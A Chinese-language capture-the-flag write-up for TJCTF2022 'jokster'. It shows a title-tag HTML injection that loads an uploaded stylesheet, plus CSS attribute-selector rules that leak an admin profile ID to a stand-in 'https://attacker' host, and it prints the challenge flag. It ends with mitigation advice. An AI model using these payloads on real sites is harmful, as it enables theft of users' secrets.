# TJCTF2022 jokster

## 题目简述

管理员账号的随机 8 字符资料 ID 未公开，而其资料页包含一条以 flag 为 punchline 的预置笑话。站点禁用脚本，但笑话 prompt 被无转义放进 `<title>`，头像上传又只按文件扩展名保存、可上传任意 CSS。管理员访问恶意笑话时，可以用 CSS 属性选择器逐段泄漏导航栏中的管理员资料链接。

## 解题过程

先注册账号并上传名为 `style.css` 的文件。自己的用户 ID 决定同源路径 `/uploads/<id>.css`。随后创建 prompt，闭合标题并引入该样式表：

```html
L</title><link rel="stylesheet" href="/uploads/攻击者ID.css"><title>
```

管理员登录后，导航栏存在 `<a href="/profile/管理员ID">`。为当前已知前缀和所有两字符组合生成规则：

```css
a[href^="/profile/ab"] {
    background-image: url("https://attacker/?x=ab");
}
```

`style-src` 允许同源上传目录，`img-src` 又允许外部图片，因此只有匹配真实链接前缀的规则会向攻击者发请求。每轮按允许字符集 `a-z0-9_-` 枚举两位，收到命中值后更新前缀并重新上传 CSS；四轮即可恢复完整 8 字符管理员 ID。

最后访问 `/profile/<管理员ID>`，页面列出预置笑话，其 punchline 为 `tjctf{but_i_tHink_im_f1na1lY_cl34N_9b9c0ad1}`。

## 方法总结

禁用 JavaScript 不等于消除数据外带。CSS 选择器能把 DOM 中的秘密转化为条件资源请求，尤其危险于同时允许用户样式与外部图片的站点。这里还依赖未转义的标题语境和任意扩展名上传；任一环节收紧都能断链，例如转义标题、校验上传 MIME、隔离用户内容域或限制 `img-src`。
